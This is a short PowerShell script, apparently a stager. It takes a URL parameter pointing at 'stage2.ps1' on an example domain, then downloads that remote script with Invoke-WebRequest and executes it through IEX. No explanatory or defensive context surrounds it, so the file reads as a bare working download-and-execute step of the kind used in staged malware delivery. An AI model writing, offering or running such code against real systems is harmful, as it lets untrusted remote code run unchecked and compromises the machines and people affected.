
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://adatum.com:80/stage2.ps1",
    [int]$ConnectionTimeout = 168
)
IEX (Invoke-WebRequest -Uri $Stage1Url -UseBasicParsing).Content
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
